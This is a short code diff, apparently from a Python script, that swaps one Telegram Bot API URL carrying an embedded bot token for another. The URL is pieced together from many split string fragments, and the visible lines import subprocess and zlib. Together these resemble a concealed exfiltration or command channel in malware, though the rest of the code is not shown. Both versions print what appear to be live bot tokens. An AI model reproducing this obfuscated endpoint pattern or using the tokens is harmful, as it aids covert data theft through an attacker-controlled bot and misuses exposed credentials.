@@ -1,4 +1,4 @@
-link = 'https://'+'a'+'pi.t'+'el'+'e'+'gr'+'am.o'+'rg/bo'+'t7515381892:AAET4Rv8so6z8yhWOKmfdLUtJio3k24ZoFE'
+link = 'https://'+'a'+'pi.t'+'el'+'e'+'gr'+'am.o'+'rg/bo'+'t7705259849:AAHOPVWsvsgtsooGHEf-koUQz31sPNLQKrM'
 
 import subprocess
 import zlib
